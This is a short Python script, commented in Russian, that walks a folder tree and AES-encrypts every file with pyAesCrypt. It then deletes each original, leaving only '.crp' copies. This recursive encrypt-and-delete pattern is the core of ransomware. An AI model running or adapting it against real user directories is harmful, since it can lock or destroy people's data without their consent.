import pyAesCrypt
import os

# Функция шифрования

def encryption(file, password):

    # Задаем размер буфера
    buffer_size = 512 * 1024

    # Вызываем метод шифрования и перередаем в него:
    pyAesCrypt.encryptFile(
        str(file),
        str(file) + ".crp",
        password,
        buffer_size
    )

    # Выведим результат зашифрованного файла

    print("[Файл '" + str(os.path.splitext(file)[0]) + "' зашифрован]")

    # В конце функции удалим исходный файл с помощью метода remove

    os.remove(file)

# Фунция сканирования дерикторий

def walking_by_dirs(dir, password):

    # перебирает все поддиректории в указанной директории

    for name in os.listdir(dir):
        path = os.path.join(dir, name)

        # если находим файл, то шифруем его

        if os.path.isfile(path):
            try:
                encryption(path, password)
            except Exception as ex:
                print(ex)
        else:
            walking_by_dirs(path, password)

password = input("Введите пароль для шифрования: ")
walking_by_dirs("C:/Users/Bogdan/Desktop/test", password)